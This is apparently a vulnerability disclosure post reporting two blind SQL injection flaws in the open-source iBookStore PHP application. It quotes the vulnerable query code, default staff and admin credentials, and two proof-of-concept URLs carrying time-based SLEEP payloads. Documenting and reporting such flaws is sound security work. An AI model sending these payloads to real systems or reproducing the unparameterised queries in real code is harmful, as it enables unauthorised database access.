---
layout: post
date: 2021-12-24 20:41:00
title: "Blind SQL Injection in MartDevelopers-Inc/iBookStore"
categories: Research
tags: [SQL Injection]
author:
  - Jeongwon Jo

---
## Summary

> The [iBookStore](https://github.com/MartDevelopers-Inc/iBookStore) is an open source bookstore auditing system. Two SQL Injection vulnerabilities exist in this open source.
```
https://github.com/MartDevelopers-Inc/iBookStore/blob/master/pages_staff_update_book.php#L74L77
https://github.com/MartDevelopers-Inc/iBookStore/blob/master/pages_admin_get_receipt.php#L35L36
```
The sql injection vulnerability occurs in the above two places.

---
## First, SQL Injection

```php
(skip..)
    <?php
    require_once('partials/_staffNav.php');
    $update = $_GET['update'];
    $ret = "SELECT * FROM  iBookStore_books WHERE b_id = '$update'";
    $stmt = $mysqli->prepare($ret);
    $stmt->execute();
    $res = $stmt->get_result();
    $cnt = 1;
    while ($books = $res->fetch_object()) {
    ?>
(skip..)
// https://github.com/MartDevelopers-Inc/iBookStore/blob/master/pages_staff_update_book.php#L74L77
```
If you look at the code here, you can see that the update variable is put into the SQL query without any validation. SQL Injection occurs during this process.

```
- Staff Account
    - Email : staff@ibookstore.org
    - Password : staff
```
Staff account is as above
```
Open the http://cloud.pocas.kr/iBookStore/pages_staff_login.php
Log in using the above account
Go to http://cloud.pocas.kr/iBookStore/pages_staff_update_book.php?update=a%27%20AND%20(SELECT%208666%20FROM%20(SELECT(SLEEP(5)))hhmy)%20AND%20%27ROfB%27=%27ROfB
Then SQL Injection occurs, and you can see that the sleep() function is executed for 5 seconds.
```
<style>
    .myvideo {
        width: auto;
        max-width: 100%;
        height: auto;
    }
</style>
<video class="myvideo" controls preload>
    <source src="https://github.com/blogpocas/DATA/raw/main/BB/iBookStore/1.mov?raw=true" type="video/mp4">
</video>

---
## Second, SQL Injection

```php
(skip..)
     <?php
    require_once('partials/_nav.php');
    $receipt = $_GET['receipt'];
    $ret = "SELECT * FROM  iBookStore_Sales WHERE s_code = '$receipt' ";
    $stmt = $mysqli->prepare($ret);
    $stmt->execute();
    $res = $stmt->get_result();
    $cnt = 1;
    while ($sales = $res->fetch_object()) {
        $total_amt = $sales->s_amt * $sales->s_copies;
        $tax = 0.14 * $total_amt;
        $taxable = $total_amt - $tax;

    ?>
(skip..)
// https://github.com/MartDevelopers-Inc/iBookStore/blob/master/pages_admin_get_receipt.php#L35L36
```
If you look at the code here, you can see that the receipt variable is put into the SQL query without any validation. SQL Injection occurs during this process.

```
- Admin Account
    - Email : admin@ibookstore.org
    - Password : admin
```
Admin account is as above
```
Open the http://cloud.pocas.kr/iBookStore/index.php
Log in using the above account
Go to http://cloud.pocas.kr/iBookStore/pages_admin_get_receipt.php?receipt=a%27%20AND%20(SELECT%208666%20FROM%20(SELECT(SLEEP(5)))hhmy)%20AND%20%27ROfB%27=%27ROfB
Then SQL Injection occurs, and you can see that the sleep() function is executed for 5 seconds.
```
<style>
    .myvideo {
        width: auto;
        max-width: 100%;
        height: auto;
    }
</style>
<video class="myvideo" controls preload>
    <source src="https://github.com/blogpocas/DATA/raw/main/BB/iBookStore/2.mov?raw=true" type="video/mp4">
</video>

---
## Reporting Timeline

- 2021-12-24 20h 46m : Opened this issue
- 2021-12-24 21h 13m : Reported this issue via the [MITRE](https://cve.mitre.org/)

---